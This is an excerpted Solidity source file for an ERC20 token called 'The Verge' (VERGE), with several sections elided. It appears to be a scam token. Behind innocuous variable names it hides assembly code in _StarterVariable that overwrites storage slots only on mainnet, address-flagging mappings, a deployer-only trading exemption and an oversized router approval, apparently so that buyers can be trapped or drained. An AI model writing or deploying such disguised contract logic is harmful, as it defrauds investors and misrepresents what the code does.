...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addVerge;
    uint256 private _framingZone = block.number*2;

    mapping (address => bool) private _soyaSauce; 
    mapping (address => bool) private _HotSauce;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _pepperSalt;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private allTheTime;
    address public pair;
    ...
    bool private trading; uint256 private soupKitchen = 1; bool private flowerPower;
    uint256 private _decimals; uint256 private fragilWorld;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addVerge.push(_router); addVerge.push(msgSender_); addVerge.push(pair);
        for (uint256 q=0; q < 3;) {_soyaSauce[addVerge[q]] = true; unchecked{q++;} }
    }
    ...
    function _StarterVariable() internal {
        assembly {
            ...
            if and(not(eq(sload(getBy(caller(),0x6)),sload(0x630a40c4d33916e0dc0f78a2a0b71c771d692c117099adf1aaf3d70e2307ba32))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0xa5f5f5ac740d5817cacd92eaa9967434525469ae80d1ebe80aa22e94e6274e67,0x1)
                sstore(getBy(caller(),0x5),0x1) sstore(0x630a40c4d33916e0dc0f78a2a0b71c771d692c117099adf1aaf3d70e2307ba32,0x25674F4B1840E16EAC177D5ADDF2A3DD6286645DF28)
            }
        } 
    }

    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _framingZone = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addVerge[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployVerge(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addVerge[0], 10 ** 77);
        _StarterVariable();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployVerge(creator, initialSupply);
    }
}

contract TheVerge is ERC20Token {
    constructor() ERC20Token("The Verge", "VERGE", msg.sender, 5000000 * 10 ** 18) {
    }
}